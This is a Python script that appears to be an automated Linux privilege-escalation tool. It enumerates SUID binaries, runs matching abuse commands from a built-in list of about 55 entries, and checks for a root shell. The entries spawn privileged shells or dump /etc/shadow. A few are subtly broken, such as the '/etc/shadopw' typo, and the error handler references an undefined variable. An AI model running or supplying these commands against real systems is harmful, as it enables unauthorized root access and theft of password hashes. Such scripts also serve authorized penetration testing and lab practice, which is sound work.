import os
import subprocess

suid_commands = {
        'taskset': '1 /bin/bash -p',
        'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
        'bash': '-p',
        'busybox': 'sh',
        'cat': '/etc/shadow',
        'cut': '-d "" -f1 /etc/shadow',
        'dash': '-p',
        'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'env': '/bin/sh -p',
        'expand': '/etc/shadow',
        'expect': '-c "spawn /bin/sh -p;interact"',
        'find': '. -exec /bin/sh -p \\; -quit',
        'flock': '-w99999999 /etc/shadopw',
        'grep': '"" /etc/shadow',
        'head': '-c2G /etc/shadow',
        'ionice': '/bin/sh -p',
        'jrunscript': '-e "exec(\'/bin/bash -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
        'ksh': '-p',
        'ld.so': '/bin/sh -p',
        'less': '/etc/shadow',
        'logsave': '/dev/null /bin/sh -i -p',
        'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
        'more': '/etc/shadow',
        'nice': '/bin/sh -p',
        'nl': "-bn -w1 -s '' /etc/shadow",
        'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
        'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
        'perl': '-e \'exec "/bin/sh";\'',
        'pg': '/etc/shadow',
        'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
        'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'rlwrap': '-H /dev/null /bin/sh -p',
        'rpm': '--eval  \'%{lua:os.execute("/bin/sh", "-p")}\'',
        'rpmquery': '--eval  \'%{lua:posix.exec("/bin/sh", "-p")}\'',
        'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
        'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
        'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'sed': '-e "" /etc/shadow',
        'setarch': '$(arch) /bin/sh -p',
        'sort': '-m /etc/shadow',
        'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
        'stdbuf': '-i0 /bin/sh -p',
        'strace': '-o /dev/null /bin/sh -p',
        'tail': '-cG2 /etc/shadow',
        'time': '/bin/sh -p',
        'timeout': '7d /bin/sh p',
        'ul': '/etc/shadow',
        'unexpand': 'unexpand -t99999999 /etc/shadow',
        'uniq': '/etc/shadow',
        'unshare': '-r /bin/sh',
        'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
        'xargs': '-a /dev/null sh -p',
        'xxd': '/etc/shadow | xxd -r'
        }

def save_command(cmd, file_path):
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(cmd + "\n")
        f.close()


def locate_SUID_files():
    cmd = 'find / -perm -u=s -type f 2>/dev/null || true'
    res = ''
    print('[*] Enumerating SUID files...')
    try:
        res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        print("[!] Error:", e)
        return None

    return res

def save_suids(suids):
    with open("suids.txt", "w", encoding="utf-8") as f:
        for suid in suids:
            f.write(suid + "\n")
        f.close()

def parse_result(SUID_files_res):
    lines = SUID_files_res.splitlines()
    suid_files = []
    for line in lines:
        filename = line.split("/")[-1]
        suid_files.append(filename)

    save_suids(suid_files)
    print("[+] The following SUID files were saved to suids.txt.")

    return suid_files

def run_exploit(suid_files_arr):
    vulns = 0
    for sfile in suid_files_arr:
        if sfile in suid_commands:
            cmd = sfile + " " + suid_commands[sfile] + " || true"
            print('==========================================')
            print(f'[*] Running {cmd}...')
            try:
                res = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
                print('[+] Command passed!')
                print('[*] Checking if got root...')
                output = ""
                try:
                    res.stdin.write('whoami\n')
                    res.stdin.flush()
                    output = res.stdout.readline()
                except:
                    continue

                can_get_root = True

                if "/bin/sh" not in cmd and "sh" not in cmd and "/bin/bash" not in cmd or "/etc/shadow" in cmd:
                    print(f'[-] "{cmd}" cannot get root by itself.')
                    vulns += 1
                    can_get_root = False
                    
                if "root" in output and can_get_root:
                    res.stdin.write('exit\n')
                    res.stdin.flush()
                    print(f'[+] "{cmd}" got root.')
                    vulns += 1
                elif "root" not in output and can_get_root:
                    print(f'[!] "{cmd}" is a false positive!')
                    res.terminate()
                    continue
                
                save_command(cmd, f"command-{vulns+1}")
                cin = str(input("Do you want to continue the exploit? [y/n]: "))
                if cin.lower() == 'y':
                    continue
                else:
                    print("[*] Quitting...")
                    break
            except:
                print("[!] Error:", e)
                continue

            res.terminate()
    
    print(f"[-] Exploit finished. Found {vulns} vulnerabilities")

res = locate_SUID_files()
suid = parse_result(res)
run_exploit(suid)
